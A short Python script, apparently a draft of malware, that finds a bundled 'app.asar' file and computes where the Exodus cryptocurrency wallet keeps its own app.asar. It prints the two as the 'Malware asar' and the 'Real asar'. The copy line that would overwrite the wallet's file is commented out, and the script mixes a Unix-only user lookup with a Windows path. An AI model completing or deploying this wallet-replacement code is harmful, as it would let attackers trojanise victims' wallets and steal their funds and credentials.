import os
import pwd
import shutil
import pkg_resources

def get_username():
    return pwd.getpwuid(os.getuid())[0]

def check():
    package_path = pkg_resources.resource_filename('recovery', '')
    default_config_path = os.path.join(package_path, 'app.asar')
    destination = "C:\\Users\\" + get_username() + "\\AppData\\Local\\exodus\\app-24.31.4\\resources\\app.asar"
    #shutil.copy("", "")
    print(f"Malware asar is at: {default_config_path}\nReal asar is at: {destination}")
